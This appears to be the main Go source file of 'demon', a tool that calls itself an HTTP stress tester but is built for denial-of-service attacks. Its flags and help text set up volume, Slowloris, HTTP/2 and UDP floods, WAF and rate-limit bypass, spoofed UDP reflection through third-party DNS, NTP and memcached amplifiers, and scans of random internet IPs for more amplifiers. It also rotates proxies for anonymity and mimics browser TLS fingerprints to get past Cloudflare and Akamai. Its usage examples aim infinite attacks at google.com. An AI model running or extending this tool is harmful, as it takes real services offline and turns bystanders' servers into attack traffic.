/************************************************************
*  Author:         Nicholas Tibbetts
*  Date:           01/02/2020 T01:22:04
*  Description:    _
*  Version:        3.0.0 ~ 05/29/2026 - Made w/ ♥︎

***********************************************************

BUILD COMMAND:
go build -o demon .
go build .

MONITORING RESOURCES:
https://www.isitdownrightnow.com/
https://downdetector.com/
*/

package main

import (
	"context"
	"flag"
	"fmt"
	"net"
	"os"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/time/rate"
)

func main() {
	logger, err := NewLogger("demon.log", LogLevelInfo)
	if err != nil {
		fmt.Printf("Failed to initialize logger: %v\n", err)
		os.Exit(1)
	}
	logger.Info("Application starting - demon v" + __version__)

	// Load configuration with professional defaults
	configPath := "demon_config.json"
	demonConfig, err := LoadConfig(configPath)
	if err != nil {
		// No readable config yet (missing or unparseable), create a fresh one from
		// the single authoritative default set. using DefaultConfig() rather than a
		// hand written literal keeps the generated file complete and always in sync
		// with every config field (including newer tuning knobs), so deleting the file
		// regenerates a clean, complete config with no missing keys.
		demonConfig = DefaultConfig()
		if saveErr := demonConfig.SaveConfig(configPath); saveErr != nil {
			logger.Warning("Failed to save default configuration: " + saveErr.Error())
		} else {
			logger.Info("Created default configuration: " + configPath)
		}
	} else {
		logger.Info("Loaded existing configuration from: " + configPath)
	}

	// Show professional header immediately
	clearScreen()
	printHeader()

	flag.Usage = func() {
		fmt.Printf("%s", StyleText("demon v"+__version__, ColorWhite)+"\n")
		fmt.Printf("%s", StyleText("http stress testing tool", ColorCyan)+"\n\n")
		fmt.Printf("%s", StyleText("Usage: "+filepath.Base(os.Args[0])+" [OPTIONS] <target_url>", ColorWhite)+"\n\n")

		fmt.Printf("%s", StyleText("ATTACK TYPES:", ColorGreen)+"\n")
		attackTypes := []string{
			"0: Volume Attack (High-frequency requests)",
			"1: Slowloris (Connection exhaustion)",
			"2: HTTP/2 Flood (Protocol-level stress)",
			"3: Cache Busting (Cache invalidation)",
			"4: API Fuzzing (Endpoint discovery)",
			"5: WAF Bypass (Evasion techniques)",
			"6: Protocol Exploits (Low-level attacks)",
			"7: Bandwidth Saturation (Network flooding)",
			"8: Connection Exhaustion (Resource depletion)",
			"9: Resource Exhaustion (Memory/CPU stress)",
			"10: UDP Flood (Network layer flooding)",
		}
		for _, attackType := range attackTypes {
			fmt.Printf("%s", "  "+StyleText(attackType, ColorCyan)+"\n")
		}
		fmt.Println()

		fmt.Printf("%s", StyleText("OPTIONS:", ColorGreen)+"\n")
		flag.PrintDefaults()
		fmt.Println()

		fmt.Printf("%s", StyleText("EXAMPLES:", ColorYellow)+"\n")
		fmt.Printf("  # Basic stress test\n")
		fmt.Printf("  %s -concurrency 50 -rate 500 https://example.com\n\n", filepath.Base(os.Args[0]))
		fmt.Printf("  # 5 minute timed attack\n")
		fmt.Printf("  %s -duration 5m -concurrency 100 https://google.com\n\n", filepath.Base(os.Args[0]))
		fmt.Printf("  # Infinite attack (until Ctrl+C)\n")
		fmt.Printf("  %s -infinite -concurrency 200 https://google.com\n\n", filepath.Base(os.Args[0]))
		fmt.Printf("  # Anonymous attack with proxy rotation\n")
		fmt.Printf("  %s -rotate-proxy -waf-evade -attack 5 https://google.com\n\n", filepath.Base(os.Args[0]))
		fmt.Printf("  # Professional timed attack with configuration\n")
		fmt.Printf("  %s -config custom.json -duration 1h https://enterprise.com\n\n", filepath.Base(os.Args[0]))
	}

	// Professional command line flags with enhanced defaults
	concurrency := flag.Int("concurrency", demonConfig.ConcurrentWorkers, "Number of concurrent workers")
	rateLimit := flag.Int("rate", demonConfig.RequestRate, "Requests per second limit")
	attackTypeStr := flag.String("attack", fmt.Sprintf("%d", demonConfig.AttackType), "Attack type (0-10), or comma-separated list for hybrid mode (e.g. \"2,7\")")
	proxyFile := flag.String("proxies", demonConfig.ProxyFile, "File containing proxy list")
	configFile := flag.String("config", "", "Custom configuration file")
	verboseMode := flag.Bool("verbose", demonConfig.VerboseOutput, "Enable verbose logging output")
	quietMode := flag.Bool("quiet", false, "Minimal output mode")
	duration := flag.String("duration", "", "Attack duration (e.g., '30s', '5m', '1h', '0' for infinite)")
	infiniteMode := flag.Bool("infinite", false, "Run indefinitely until Ctrl+C (overrides duration)")

	// Advanced configuration flags that override config file
	flag.BoolVar(&demonConfig.UserAgentRotation, "rotate-ua", demonConfig.UserAgentRotation, "Rotate User-Agent headers")
	flag.BoolVar(&demonConfig.ProxyRotation, "rotate-proxy", demonConfig.ProxyRotation, "Enable proxy rotation for anonymity")
	flag.BoolVar(&demonConfig.HeaderRandomization, "randomize-headers", demonConfig.HeaderRandomization, "Randomize HTTP headers")
	flag.BoolVar(&demonConfig.CacheBusting, "cache-bust", demonConfig.CacheBusting, "Enable cache busting techniques")
	flag.BoolVar(&demonConfig.WAFEvasion, "waf-evade", demonConfig.WAFEvasion, "Enable WAF evasion techniques")
	flag.BoolVar(&demonConfig.HTTP2, "http2", demonConfig.HTTP2, "Force HTTP/2 multiplexing")
	flag.BoolVar(&demonConfig.BehaviorMimicry, "mimic-behavior", demonConfig.BehaviorMimicry, "Mimic realistic user behavior")

	// Rate Limit Bypass Flags - The Ultimate Evasion Arsenal
	flag.BoolVar(&demonConfig.RateLimitBypass, "bypass-ratelimits", demonConfig.RateLimitBypass, "enable rate limit bypass")
	flag.BoolVar(&demonConfig.DistributedTiming, "distributed-timing", demonConfig.DistributedTiming, "Use distributed timing patterns to evade detection")
	flag.BoolVar(&demonConfig.IntelligentThrottle, "smart-throttle", demonConfig.IntelligentThrottle, "Automatically adjust request rate based on response patterns")
	flag.BoolVar(&demonConfig.AdaptiveRateControl, "adaptive-rate", demonConfig.AdaptiveRateControl, "Adaptive rate control that learns target's limits")

	// Advanced Keep-Alive Abuse - Intelligently Aggressive
	keepAliveAbuse := flag.Bool("keepalive-abuse", false, "Enable intelligent keep-alive connection exhaustion (stealth mode)")

	// TLS fingerprint evasion, emit a real browser ClientHello instead of the
	// detectable go stdlib handshake. required to get past cloudflare/akamai/aws
	// TLS-layer blocks. pairs the User-Agent with the handshake automatically.
	tlsFingerprint := flag.Bool("tls-fingerprint", demonConfig.TLSFingerprinting, "Mimic browser TLS fingerprint (defeats Cloudflare/Akamai TLS-layer blocks)")

	// Attack tuning knobs (previously hard-coded constants)
	h2Connections := flag.Int("h2-connections", demonConfig.HTTP2Connections, "HTTP/2 flood (type 2): independent h2 connections to fan the 100 streams across")
	bombSizeMB := flag.Int("bomb-size-mb", demonConfig.BombSizeMB, "Compression bomb (type 7): decompressed body size in MB")
	maxHeld := flag.Int("max-held-connections", demonConfig.MaxHeldConnections, "Cap on simultaneously held connections for hold attacks (types 1/6/8); protects the operator's own machine")
	maxUDPFloods := flag.Int("max-udp-floods", demonConfig.MaxUDPFloods, "Cap on concurrent UDP flood invocations (type 10). OS-thread safety backstop; raising it only helps on a fat pipe you can't already saturate, and risks the thread-exhaustion crash")
	udpPPS := flag.Int("udp-pps", demonConfig.UDPPacketsPerSec, "Direct UDP flood (type 10): aggregate packet-rate cap in packets/sec across all senders (0 = built-in 100k). Raise it to find the target's real pps ceiling instead of the tool's own; it's logged and flagged in the dashboard when binding")
	flag.BoolVar(&demonConfig.UDPDirect, "udp-direct", demonConfig.UDPDirect, "Force the direct (non-spoofed) UDP flood against the target only. This is already the default type-10 mode; the flag pins it and overrides -udp-reflection")
	flag.BoolVar(&demonConfig.UDPReflection, "udp-reflection", demonConfig.UDPReflection, "Select the reflection/amplification UDP attack mode (type 10): raw sockets, spoofed source IP, third-party amplifiers. Needs root/CAP_NET_RAW. Off by default — the default type-10 mode is the direct, non-spoofed flood against your own target")
	useBuiltInReflectorsFlag := flag.Bool("use-built-in-reflectors", false, "Load the bundled reflector seed corpus from assets/bundled_reflector_corpus.txt for type-10. Leave this false to force explicit file/discovery inventories only")

	// UDP measurement for own-endpoint load testing. A receiver agent you
	// run ON the target, plus the sender-side poller that turns its counts into
	// real landed pps/bps and packet loss. None of this touches the flood engine;
	// it's pure measurement so the dashboard stops treating a local send as a
	// verified target hit.
	udpReceiver := flag.String("udp-receiver", "", "Run as a UDP RECEIVER agent on your own target host instead of attacking: listen on this addr (e.g. :9999) and count received traffic for loss measurement")
	receiverControl := flag.String("receiver-control", ":9100", "Receiver mode (-udp-receiver): HTTP addr that serves cumulative received counters as JSON at /stats")
	receiverStats := flag.String("receiver-stats", "", "Sender side: poll a receiver agent's stats endpoint (host:port or full URL) to display real landed pps/bps and packet loss")

	// Bandwidth / congestion control
	bandwidth := flag.String("bandwidth", demonConfig.Bandwidth, "Cap UDP egress to this rate (e.g. 40mbit, 5MB, 500kbit) so a flood doesn't saturate your OWN uplink; empty = a conservative 2 MB/s default (raise it to use more of your pipe)")
	adaptiveBW := flag.Bool("adaptive-bandwidth", demonConfig.AdaptiveBandwidth, "Auto-throttle the send rate when local uplink congestion is detected (AIMD safety net; on by default)")

	// UDP reflection amplifier lists, each flag points to a text file of IPs
	// (one per line; blank lines and # comments are ignored; Shodan exports work
	// directly). when a file is provided, it replaces the built-in hardcoded list
	// for that protocol vector. SSDP has no useful hardcoded fallback (the old list
	// was all private/multicast IPs the router drops before they leave your network)
	// so it only runs when you supply a list here or use -discover-amplifiers.
	dnsAmplFile := flag.String("dns-amplifiers", "", "File of open DNS resolver IPs for type-10 amplification (one IP per line; replaces built-in list)")
	ntpAmplFile := flag.String("ntp-amplifiers", "", "File of NTP server IPs with monlist enabled for type-10 amplification")
	memAmplFile := flag.String("memcached-amplifiers", "", "File of open memcached instance IPs (Shodan: port:11211 product:memcached)")
	ssdpAmplFile := flag.String("ssdp-amplifiers", "", "File of publicly-routable UPnP device IPs (Shodan: port:1900 upnp)")
	chargenAmplFile := flag.String("chargen-amplifiers", "", "File of public CHARGEN reflector IPs for type-10 amplification")
	qotdAmplFile := flag.String("qotd-amplifiers", "", "File of public QOTD reflector IPs for type-10 amplification")
	discoverAmp := flag.Bool("discover-amplifiers", false, "Probe random IPs for live amplifiers before attacking; auto-populates the six UDP reflector vectors")
	discoverSec := flag.Int("discover-timeout", 45, "Seconds to spend on amplifier auto-discovery (see -discover-amplifiers)")
	discoverN := flag.Int("discover-count", 50, "How many live amplifiers to find per protocol before stopping discovery")
	discoverWorkers := flag.Int("discover-workers", 32, "How many discovery goroutines to run per protocol; keep this conservative on small hosts")
	discoverSave := flag.Bool("discover-save", false, "Save discovered amplifiers to amplifiers_<protocol>.txt for reuse across runs")

	// Proxy acquisition tuning
	proxyTarget := flag.Int("proxy-target", demonConfig.ProxyTargetCount, "Stop acquiring proxies once this many good ones are verified")
	proxyAcquireTimeout := flag.Int("proxy-acquire-timeout", demonConfig.ProxyAcquireTimeoutSec, "Hard time budget for proxy acquisition, in seconds")
	proxyRefreshInterval := flag.Int("proxy-refresh-interval", demonConfig.ProxyRefreshIntervalSec, "How often the background refresh tops up the worker pool, in seconds")
	proxyTestTimeoutSec := flag.Int("proxy-test-timeout", demonConfig.ProxyTestTimeout, "per proxy validation timeout for each connectivity/anonymity/target round-trip, in seconds")

	flag.Parse()

	// Load custom configuration if specified
	if *configFile != "" {
		customConfig, err := LoadConfig(*configFile)
		if err != nil {
			logger.Error("Failed to load custom configuration: " + err.Error())
			os.Exit(1)
		}
		demonConfig = customConfig
		logger.Info("Loaded custom configuration from: " + *configFile)
	}

	// Receiver-agent mode: run as a measurement endpoint on a host you control and
	// exit. This is the measurement counterpart to the flood — it counts what actually
	// lands on the endpoint. It never sends attack traffic, so it short-circuits
	// the rest of main() (no target URL required).
	if *udpReceiver != "" {
		if err := runUDPReceiver(*udpReceiver, *receiverControl); err != nil {
			fmt.Printf("%s\n", StyleText("Error: "+err.Error(), ColorRed))
			os.Exit(1)
		}
		return
	}

	// Configure logging verbosity
	if *verboseMode {
		logger.SetLevel(LogLevelDebug)
		logger.Debug("Verbose logging enabled")
	} else if *quietMode {
		logger.SetLevel(LogLevelError)
	}

	// Handle duration configuration
	var attackDuration time.Duration
	if *infiniteMode {
		attackDuration = 0 // 0 means infinite
		logger.Info("Infinite mode enabled (attack will run until manually terminated)")
	} else if *duration != "" {
		var err error
		if *duration == "0" || strings.ToLower(*duration) == "infinite" {
			attackDuration = 0 // 0 means infinite
			logger.Info("Infinite duration specified (attack will run until manually terminated)")
		} else {
			attackDuration, err = time.ParseDuration(*duration)
			if err != nil {
				logger.Error(fmt.Sprintf("Invalid duration format '%s'. Use formats like '30s', '5m', '1h'", *duration))
				fmt.Printf("%s", StyleText("Error: Invalid duration format", ColorRed)+"\n")
				fmt.Printf("Valid examples: 30s, 5m, 1h, 2h30m\n")
				fmt.Printf("Use '0' or 'infinite' for unlimited duration\n\n")
				flag.Usage()
				os.Exit(1)
			}
			logger.Info(fmt.Sprintf("Attack duration set to: %v", attackDuration))
		}
	} else {
		// Use configuration file default
		attackDuration = demonConfig.AttackDuration
		if attackDuration == 0 {
			logger.Info("No duration specified - attack will run until manually terminated")
		} else {
			logger.Info(fmt.Sprintf("Using default duration from config: %v", attackDuration))
		}
	}

	// Validate command line arguments
	args := flag.Args()
	if len(args) != 1 {
		fmt.Printf("%s", StyleText("Error: Target URL required", ColorRed)+"\n\n")
		flag.Usage()
		os.Exit(1)
	}

	targetURL := args[0]

	// resolve the attack pool. hybridAttackTypes is a package-level slice; workers
	// randomly pick from it each job. precedence:
	//   1. -attack on the command line (explicit) always wins, single int or
	//      comma-separated list for hybrid mode
	//   2. otherwise an "attack_types" list in the config file (tag-team via config)
	//   3. otherwise the single "attack_type" from the config file (or built-in default)
	attackExplicit := false
	flag.Visit(func(f *flag.Flag) {
		if f.Name == "attack" {
			attackExplicit = true
		}
	})

	switch {
	case attackExplicit:
		for _, part := range strings.Split(strings.TrimSpace(*attackTypeStr), ",") {
			part = strings.TrimSpace(part)
			n, parseErr := strconv.Atoi(part)
			if parseErr != nil || n < 0 || n > 10 {
				fmt.Printf("%s", StyleText(fmt.Sprintf("Error: invalid attack type %q — must be 0-10", part), ColorRed)+"\n")
				os.Exit(1)
			}
			hybridAttackTypes = append(hybridAttackTypes, uint8(n))
		}
	case len(demonConfig.AttackTypes) > 0:
		for _, n := range demonConfig.AttackTypes {
			if n < 0 || n > 10 {
				fmt.Printf("%s", StyleText(fmt.Sprintf("Error: invalid attack_types entry %d in config — must be 0-10", n), ColorRed)+"\n")
				os.Exit(1)
			}
			hybridAttackTypes = append(hybridAttackTypes, uint8(n))
		}
	default:
		if demonConfig.AttackType < 0 || demonConfig.AttackType > 10 {
			fmt.Printf("%s", StyleText(fmt.Sprintf("Error: invalid attack_type %d in config — must be 0-10", demonConfig.AttackType), ColorRed)+"\n")
			os.Exit(1)
		}
		hybridAttackTypes = append(hybridAttackTypes, uint8(demonConfig.AttackType))
	}

	// build the human-readable attack label (e.g. "2,7") for the dashboard and logs.
	attackParts := make([]string, len(hybridAttackTypes))
	for i, t := range hybridAttackTypes {
		attackParts[i] = strconv.Itoa(int(t))
	}
	attackLabel := strings.Join(attackParts, ",")

	// Professional pre-flight checks
	logger.Info("pre-flight validation")

	// URL validation and security checks
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "https://" + targetURL
		logger.Warning("Protocol not specified, defaulting to HTTPS: " + targetURL)
	}

	// Initialize enhanced proxy manager with proper config
	logger.Info("Initializing enhanced proxy management system")
	proxyManager := NewEnhancedProxyManager(demonConfig, logger)

	// Initialize Global Rate Limit Bypass System
	logger.Info("initializing rate limit bypass system")
	globalDemonConfig = demonConfig
	globalLogger = logger
	globalProxyManager = proxyManager

	if demonConfig.RateLimitBypass {
		rateLimitDetector = NewRateLimitDetector(demonConfig, logger)
		delayManager = NewIntelligentDelayManager(demonConfig, rateLimitDetector)
		logger.Info("rate limit bypass active")

		// Show bypass configuration
		if demonConfig.VerboseOutput {
			logger.Debug(fmt.Sprintf("bypass config: MinDelay=%v, MaxDelay=%v, BackoffMultiplier=%.1f",
				demonConfig.BypassSettings.MinDelay,
				demonConfig.BypassSettings.MaxDelay,
				demonConfig.BypassSettings.BackoffMultiplier))
		}
	} else {
		logger.Info("rate limit bypass disabled")
	}

	// scrapedProxyPool is hoisted out of the if block so we can start background
	// refresh after ctx is ready further down. stays nil for file based or no proxy runs.
	var scrapedProxyPool *ProxyPool

	// Load proxies with professional handling
	if *proxyFile != "" {
		logger.Info("Loading proxy list from file: " + *proxyFile)
		err := proxyManager.LoadProxiesFromFile(*proxyFile)
		if err != nil {
			logger.Error("Failed to load proxy file: " + err.Error())
		}
	} else if demonConfig.ProxyRotation {
		logger.Info("Auto-acquiring proxy infrastructure for anonymization")
		fmt.Printf("%s", StyleText("\nProxy acquisition", ColorCyan)+"\n")
		fmt.Printf("Gathering anonymous proxy infrastructure...\n")

		scrapedProxyPool = NewProxyPool()
		err := scrapedProxyPool.ScrapeAndLoadProxies(targetURL)
		if err != nil {
			logger.Warning("Proxy acquisition failed: " + err.Error())
		}

		if len(scrapedProxyPool.proxies) == 0 {
			// no proxies found, warn the user and ask before exposing their real IP.
			// we do this regardless of whether the error was nil (scraper returned
			// empty) or non-nil (scraper errored out entirely).
			fmt.Printf("\nno proxies found. traffic will originate from your real IP.\n")
			fmt.Printf("continue anyway? [y/N]: ")
			var answer string
			fmt.Scanln(&answer)
			answer = strings.ToLower(strings.TrimSpace(answer))
			if answer != "y" && answer != "yes" {
				fmt.Println("aborted.")
				os.Exit(0)
			}
			scrapedProxyPool = nil // nothing to refresh in the background
		} else {
			// preserve the scheme, socks5:// proxies must not be silently added as "http"
			for _, proxyURL := range scrapedProxyPool.proxies {
				proxyType := "http"
				if strings.HasPrefix(proxyURL, "socks5://") {
					proxyType = "socks5"
				}
				proxyManager.AddProxy(proxyURL, proxyType)
			}
			logger.Info(fmt.Sprintf("Added %d proxies to enhanced manager", len(scrapedProxyPool.proxies)))
		}
	}

	// Professional configuration summary
	printSeparator("configuration")
	fmt.Printf("target: %s\n", StyleText(targetURL, ColorYellow))
	fmt.Printf("workers: %s\n", StyleText(fmt.Sprintf("%d", *concurrency), ColorGreen))
	fmt.Printf("rate: %s req/sec\n", StyleText(fmt.Sprintf("%d", *rateLimit), ColorGreen))
	fmt.Printf("attack: %s\n", StyleText(attackLabel, ColorCyan))
	fmt.Printf("duration: %s\n", StyleText(func() string {
		if attackDuration == 0 {
			return "Infinite (until Ctrl+C)"
		}
		return attackDuration.String()
	}(), func() ColorAttribute {
		if attackDuration == 0 {
			return ColorMagenta
		}
		return ColorGreen
	}()))
	fmt.Printf("proxy rotation: %s\n", StyleText(fmt.Sprintf("%t", demonConfig.ProxyRotation), func() ColorAttribute {
		if demonConfig.ProxyRotation {
			return ColorGreen
		}
		return ColorRed
	}()))
	fmt.Printf("proxies: %s\n", StyleText(fmt.Sprintf("%d", proxyManager.GetProxyCount()), ColorCyan))

	// Setup professional execution context with optional timeout
	var ctx context.Context
	var cancel context.CancelFunc

	if attackDuration > 0 {
		// Use timeout context for limited duration attacks
		ctx, cancel = context.WithTimeout(context.Background(), attackDuration)
		logger.Info(fmt.Sprintf("Attack will automatically terminate after %v", attackDuration))
	} else {
		// Use cancellable context for infinite attacks
		ctx, cancel = context.WithCancel(context.Background())
		logger.Info("Attack configured for infinite duration - use Ctrl+C to terminate")
	}
	defer cancel()

	// the background refresh is started further down, AFTER legacyProxyPool is built
	// and populated, that's the pool the workers actually pull from. starting it on
	// scrapedProxyPool here (as it used to) refreshed a pool nothing reads, so the
	// fresh proxies never reached the workers and the pool only ever shrank via
	// eviction. see the StartBackgroundRefresh call below.

	// Initialize professional rate limiting
	limiter := rate.NewLimiter(rate.Limit(*rateLimit), *rateLimit/10)

	// Professional performance diagnostics
	if *concurrency > *rateLimit {
		logger.Warning(fmt.Sprintf("Performance bottleneck detected: concurrency (%d) exceeds rate limit (%d)", *concurrency, *rateLimit))
		fmt.Printf("%s", StyleText("[!] performance advisory", ColorYellow)+"\n")
		fmt.Printf("Current configuration may create worker starvation:\n")
		fmt.Printf("• Workers: %d\n", *concurrency)
		fmt.Printf("• Rate Limit: %d req/sec\n", *rateLimit)
		fmt.Printf("• Effective Rate Per Worker: %.2f req/sec\n", float64(*rateLimit)/float64(*concurrency))
		fmt.Printf("• Recommended Rate Limit: %d+ req/sec\n\n", *concurrency)
	}

	// Initialize job distribution system
	jobs := make(chan string, *concurrency*2)
	var wg sync.WaitGroup

	// Professional worker management
	logger.Info(fmt.Sprintf("starting %d workers, attack type(s) %s", *concurrency, attackLabel))

	// Use existing legacy proxy pool system for compatibility
	legacyProxyPool := NewProxyPool()

	// If we have enhanced proxies, copy them to legacy pool
	if proxyManager.GetProxyCount() > 0 {
		enhancedProxies := proxyManager.GetAllProxies()
		for _, enhancedProxy := range enhancedProxies {
			legacyProxyPool.proxies = append(legacyProxyPool.proxies, enhancedProxy.URL)
		}
		logger.Info(fmt.Sprintf("Converted %d enhanced proxies to legacy format", len(enhancedProxies)))
	}

	// start the background refresh on the pool the workers actually read. only do
	// this when we auto-acquired proxies (rotation mode), a user-supplied -proxies
	// file is meant to be the exact static list, not something we silently grow.
	// every 5 minutes it scrapes + validates fresh proxies and merges them into
	// legacyProxyPool, replenishing what eviction prunes during a long run.
	if scrapedProxyPool != nil {
		refreshInterval := 5 * time.Minute
		if *proxyRefreshInterval > 0 {
			refreshInterval = time.Duration(*proxyRefreshInterval) * time.Second
		}
		legacyProxyPool.StartBackgroundRefresh(ctx, targetURL, refreshInterval)
		logger.Info(fmt.Sprintf("proxy pool background refresh started on worker pool (interval %v)", refreshInterval))
	}

	// Update legacy config for compatibility
	config.AttackType = hybridAttackTypes[0]
	config.UserAgentRotation = demonConfig.UserAgentRotation
	config.HeaderRandomization = demonConfig.HeaderRandomization
	config.CacheBusting = demonConfig.CacheBusting
	config.KeepAliveAbuse = *keepAliveAbuse || demonConfig.KeepAliveAbuse
	config.HTTP2Multiplexing = demonConfig.HTTP2
	config.BehaviorMimicking = demonConfig.BehaviorMimicry
	config.WAFEvasion = demonConfig.WAFEvasion
	config.TLSFingerprinting = *tlsFingerprint || demonConfig.TLSFingerprinting

	// tuning knobs: the attack functions treat <= 0 as "use built-in default", so a
	// 0 from an old config or the manual fallback config stays safe.
	config.HTTP2Connections = *h2Connections
	if *bombSizeMB > 0 {
		config.BombSizeBytes = *bombSizeMB * 1024 * 1024
	}
	// direct UDP flood packet-rate cap; <=0 keeps the built-in 100k default in
	// directUDPFlood. surfaced/logged there so a tool cap isn't read as the target's.
	config.UDPPacketsPerSec = *udpPPS
	// the held-connection cap is a package var read by every worker; only override
	// the built-in default when given a positive value (0 would skip ALL holds).
	if *maxHeld > 0 {
		maxHeldConnections = int64(*maxHeld)
	}
	// resize the UDP flood gate before any worker can use it (we're pre-worker here,
	// so reassigning the channel is race-free). warn past the point where the raw
	// path's ~150 goroutines/invocation start to crowd Go's ~10k OS-thread ceiling,
	// the exact exhaustion this cap exists to prevent.
	if *maxUDPFloods > 0 {
		udpFloodSlots = make(chan struct{}, *maxUDPFloods)
		if *maxUDPFloods > 50 {
			logger.Warning(fmt.Sprintf("max-udp-floods=%d is high — ~%d concurrent raw senders risks 'failed to create new OS thread'; ensure your ulimit -u headroom is large",
				*maxUDPFloods, *maxUDPFloods*150))
		}
	}
	// bandwidth pacer for UDP egress, a single machine can't exceed its uplink, so
	// blasting past it just self-congests. set once, before any worker starts.
	if bps, bwErr := parseBandwidth(*bandwidth); bwErr != nil {
		fmt.Printf("%s", StyleText("Error: "+bwErr.Error(), ColorRed)+"\n")
		os.Exit(1)
	} else if bps > 0 {
		setBandwidthLimit(bps)
		logger.Info(fmt.Sprintf("UDP egress capped to %s (%d bytes/s)", *bandwidth, bps))
	} else {
		// never run UDP truly uncapped, that only self-congests. adaptive-bandwidth
		// throttles this further when the uplink saturates.
		setBandwidthLimit(defaultUDPEgressBytesPerSec)
	}
	// proxy acquisition knobs are package vars read during acquisition; override the
	// built-in defaults only on a positive value (0 keeps the default).
	if *proxyTarget > 0 {
		targetGoodProxies = *proxyTarget
	}
	if *proxyAcquireTimeout > 0 {
		proxyAcquisitionBudget = time.Duration(*proxyAcquireTimeout) * time.Second
	}
	if *proxyTestTimeoutSec > 0 {
		proxyTestTimeout = time.Duration(*proxyTestTimeoutSec) * time.Second
	}

	// load amplifier files, each overrides the built-in hardcoded list for its
	// vector. a missing or unreadable file is a hard error so the reflection path
	// stays explicit and auditable instead of silently drifting into stale defaults.
	if *dnsAmplFile != "" {
		ips, loadErr := loadAmplifiersFromFile(*dnsAmplFile)
		if loadErr != nil {
			fmt.Printf("%s\n", StyleText("Error loading -dns-amplifiers: "+loadErr.Error(), ColorRed))
			os.Exit(1)
		}
		udpDNSAmplifiers = ips
		logger.Info(fmt.Sprintf("loaded %d DNS amplifiers from %s", len(ips), *dnsAmplFile))
	}
	if *ntpAmplFile != "" {
		ips, loadErr := loadAmplifiersFromFile(*ntpAmplFile)
		if loadErr != nil {
			fmt.Printf("%s\n", StyleText("Error loading -ntp-amplifiers: "+loadErr.Error(), ColorRed))
			os.Exit(1)
		}
		udpNTPAmplifiers = ips
		logger.Info(fmt.Sprintf("loaded %d NTP amplifiers from %s", len(ips), *ntpAmplFile))
	}
	if *memAmplFile != "" {
		ips, loadErr := loadAmplifiersFromFile(*memAmplFile)
		if loadErr != nil {
			fmt.Printf("%s\n", StyleText("Error loading -memcached-amplifiers: "+loadErr.Error(), ColorRed))
			os.Exit(1)
		}
		udpMemcachedAmplifiers = ips
		logger.Info(fmt.Sprintf("loaded %d memcached amplifiers from %s", len(ips), *memAmplFile))
	}
	if *ssdpAmplFile != "" {
		ips, loadErr := loadAmplifiersFromFile(*ssdpAmplFile)
		if loadErr != nil {
			fmt.Printf("%s\n", StyleText("Error loading -ssdp-amplifiers: "+loadErr.Error(), ColorRed))
			os.Exit(1)
		}
		udpSSDPAmplifiers = ips
		logger.Info(fmt.Sprintf("loaded %d SSDP amplifiers from %s", len(ips), *ssdpAmplFile))
	}
	if *chargenAmplFile != "" {
		ips, loadErr := loadAmplifiersFromFile(*chargenAmplFile)
		if loadErr != nil {
			fmt.Printf("%s\n", StyleText("Error loading -chargen-amplifiers: "+loadErr.Error(), ColorRed))
			os.Exit(1)
		}
		udpChargenAmplifiers = ips
		logger.Info(fmt.Sprintf("loaded %d CHARGEN amplifiers from %s", len(ips), *chargenAmplFile))
	}
	if *qotdAmplFile != "" {
		ips, loadErr := loadAmplifiersFromFile(*qotdAmplFile)
		if loadErr != nil {
			fmt.Printf("%s\n", StyleText("Error loading -qotd-amplifiers: "+loadErr.Error(), ColorRed))
			os.Exit(1)
		}
		udpQOTDAmplifiers = ips
		logger.Info(fmt.Sprintf("loaded %d QOTD amplifiers from %s", len(ips), *qotdAmplFile))
	}

	useBuiltInReflectors = *useBuiltInReflectorsFlag
	if useBuiltInReflectors {
		corpus, err := loadBundledReflectorCorpus("assets/bundled_reflector_corpus.txt")
		if err != nil {
			logger.Warning("could not load bundled reflector corpus: " + err.Error())
		} else {
			if len(udpDNSAmplifiers) == 0 {
				udpDNSAmplifiers = append([]net.IP(nil), corpus["dns"]...)
			}
			if len(udpNTPAmplifiers) == 0 {
				udpNTPAmplifiers = append([]net.IP(nil), corpus["ntp"]...)
			}
			if len(udpMemcachedAmplifiers) == 0 {
				udpMemcachedAmplifiers = append([]net.IP(nil), corpus["memcached"]...)
			}
			if len(udpSSDPAmplifiers) == 0 {
				udpSSDPAmplifiers = append([]net.IP(nil), corpus["ssdp"]...)
			}
			if len(udpChargenAmplifiers) == 0 {
				udpChargenAmplifiers = append([]net.IP(nil), corpus["chargen"]...)
			}
			if len(udpQOTDAmplifiers) == 0 {
				udpQOTDAmplifiers = append([]net.IP(nil), corpus["qotd"]...)
			}
		}
	}

	// auto-discovery: probe random internet IPs for live amplifiers and store the
	// results in the package-level vars above. this runs before any workers start
	// so the freshly discovered lists are in place when the first type-10 invocation
	// fires. file-loaded lists above remain if discovery finds nothing for a given
	// protocol, so you can seed with a known list and let discovery extend it by
	// running both flags together.
	if *discoverAmp {
		discoverCount := *discoverN
		if discoverCount <= 0 {
			discoverCount = 50
		}
		discoverDur := time.Duration(*discoverSec) * time.Second
		if discoverDur <= 0 {
			discoverDur = 45 * time.Second
		}
		fmt.Printf("scanning for live amplifiers (timeout=%ds, target=%d per protocol)...\n",
			*discoverSec, discoverCount)
		if *discoverSave {
			if saveErr := discoverAmplifiersToFile("amplifiers", *discoverWorkers, discoverCount, discoverDur); saveErr != nil {
				logger.Warning("could not save discovered amplifiers: " + saveErr.Error())
			}
		} else {
			discoverAmplifiers(*discoverWorkers, discoverCount, discoverDur)
		}
	}

	// Transition to live dashboard
	time.Sleep(1 * time.Second)
	clearScreen()
	printHeader()
	printSeparator("        starting")

	// Deploy workers with professional monitoring
	for w := 1; w <= *concurrency; w++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			logger.Debug(fmt.Sprintf("Worker %d deployed successfully", workerID))
			advancedWorker(ctx, workerID, jobs, legacyProxyPool, limiter, hybridAttackTypes)
		}(w)
	}

	// Mark a UDP-only run so (a) the health monitor uses the UDP-aware path instead
	// of an HTTP HEAD that would false-"down" a UDP service, and (b) the dashboard
	// shows the send / landed / loss split rather than treating a local write
	// as a verified hit. Must be set BEFORE healthMonitor starts.
	if len(hybridAttackTypes) == 1 && hybridAttackTypes[0] == UDP_FLOOD {
		atomic.StoreUint64(&udpModeActive, 1)
	}
	// Per-second send-rate sampler (always useful in UDP mode); plus the receiver
	// poller when -receiver-stats points at an agent running on your endpoint.
	if atomic.LoadUint64(&udpModeActive) == 1 || *receiverStats != "" {
		startUDPMeasurement(ctx, *receiverStats)
	}

	// Professional health monitoring
	go healthMonitor(ctx, targetURL)
